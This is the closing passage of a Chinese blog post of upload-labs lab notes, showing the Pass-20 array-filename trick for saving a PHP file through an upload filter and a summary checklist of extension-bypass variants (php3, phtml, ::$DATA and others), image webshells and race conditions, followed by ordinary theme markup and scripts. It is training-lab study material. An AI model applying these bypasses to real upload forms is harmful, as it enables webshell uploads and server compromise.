+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123113636206.png" alt="image-20210123113636206"></p>
+<p>结果</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123113706523.png" alt="image-20210123113706523"></p>
+<p>参考这篇文章里的图</p>
+<p><a href="https://xz.aliyun.com/t/4029#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/4029#toc-16</a></p>
+<p><img src="/2021/02/23/upload-labs学习笔记/20190527142730-812f49fc-8048-1.png" alt="img"></p>
+<p>和他的复现，他的思路是</p>
+<p>file[0] = up.php/</p>
+<p>file[1]为空</p>
+<p>file[2] = jpg</p>
+<p>然后拼接出来的文件名是 up.php/.</p>
+<p>然后move_upload_file的时候会忽略 斜杠点，就可以传up.php了</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123113500745.png" alt="image-20210123113500745"></p>
+<p>结果</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123113513439.png" alt="image-20210123113513439"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件上传，先看有无前端校验</p>
+<p>然后看burp包的结构，以及页面结果</p>
+<p>先试试传php，以及php的各种变体，php.aa，php.7z，PHP，php空格，php3，phtml，php::$DATA，php点空格点</p>
+<p>传图片马，后缀为png的，copy出来的，真图片马</p>
+<p>最后考虑条件竞争，代码审计等</p>
+<p>附一张先知社区的图，来源 <a href="https://xz.aliyun.com/t/4029#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/4029#toc-12</a></p>
+<p><img src="/2021/02/23/upload-labs学习笔记/20190527142723-7cd5273c-8048-1.png" alt="img"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Upload/" rel="tag"># Upload</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/01/23/DVWA学习笔记/" rel="next" title="DVWA学习笔记">
+                <i class="fa fa-chevron-left"></i> DVWA学习笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/11/15/软件分析笔记/" rel="prev" title="软件分析笔记">
+                软件分析笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/rabbit_true.jpg" alt="oxygen-hunter">
+            
+              <p class="site-author-name" itemprop="name">oxygen-hunter</p>
+              <p class="site-description motion-element" itemprop="description">E = MC^2, Errors = (More Code)^2</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/oxygen-hunter" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:xiao.li@smail.nju.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://purecall.github.io/" title="vct" target="_blank">vct</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://kmuay.com/" title="kmuay" target="_blank">kmuay</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-01-前端js校验"><span class="nav-number">1.</span> <span class="nav-text">Pass-01-前端js校验</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-02-后端检查Content-Type"><span class="nav-number">2.</span> <span class="nav-text">Pass-02-后端检查Content-Type</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-03-黑名单php3-phtml"><span class="nav-number">3.</span> <span class="nav-text">Pass-03-黑名单php3 phtml</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-04-黑名单-htaccess"><span class="nav-number">4.</span> <span class="nav-text">Pass-04-黑名单.htaccess</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-05-黑名单大小写绕过"><span class="nav-number">5.</span> <span class="nav-text">Pass-05-黑名单大小写绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-06-黑名单加空格"><span class="nav-number">6.</span> <span class="nav-text">Pass-06-黑名单加空格</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-07-黑名单apache解析漏洞"><span class="nav-number">7.</span> <span class="nav-text">Pass-07-黑名单apache解析漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-08-黑名单加-DATA"><span class="nav-number">8.</span> <span class="nav-text">Pass-08-黑名单加::$DATA</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-09-黑名单后缀点空点"><span class="nav-number">9.</span> <span class="nav-text">Pass-09-黑名单后缀点空点 . .</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-10-双写php绕过replace"><span class="nav-number">10.</span> <span class="nav-text">Pass-10-双写php绕过replace</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-11-GET型-00"><span class="nav-number">11.</span> <span class="nav-text">Pass-11-GET型%00</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-12-POST型00截断save-path"><span class="nav-number">12.</span> <span class="nav-text">Pass-12-POST型00截断save_path</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-13-图片马检查magic-number"><span class="nav-number">13.</span> <span class="nav-text">Pass-13-图片马检查magic number</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-14-图片马getimagesize-gt-0"><span class="nav-number">14.</span> <span class="nav-text">Pass-14-图片马getimagesize&gt;=0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-15-类型检查exif-imagetype"><span class="nav-number">15.</span> <span class="nav-text">Pass-15-类型检查exif_imagetype</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-16-二次渲染"><span class="nav-number">16.</span> <span class="nav-text">Pass-16-二次渲染</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#gif"><span class="nav-number">16.1.</span> <span class="nav-text">gif</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#png"><span class="nav-number">16.2.</span> <span class="nav-text">png</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jpg-jpeg"><span class="nav-number">16.3.</span> <span class="nav-text">jpg/jpeg</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-17-条件竞争"><span class="nav-number">17.</span> <span class="nav-text">Pass-17-条件竞争</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-18-条件竞争-apache解析漏洞"><span class="nav-number">18.</span> <span class="nav-text">Pass-18-条件竞争+apache解析漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-19-自定义保存文件名-黑名单"><span class="nav-number">19.</span> <span class="nav-text">Pass-19-自定义保存文件名+黑名单</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-20-POST定义关联数组"><span class="nav-number">20.</span> <span class="nav-text">Pass-20-POST定义关联数组</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">21.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">oxygen-hunter</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
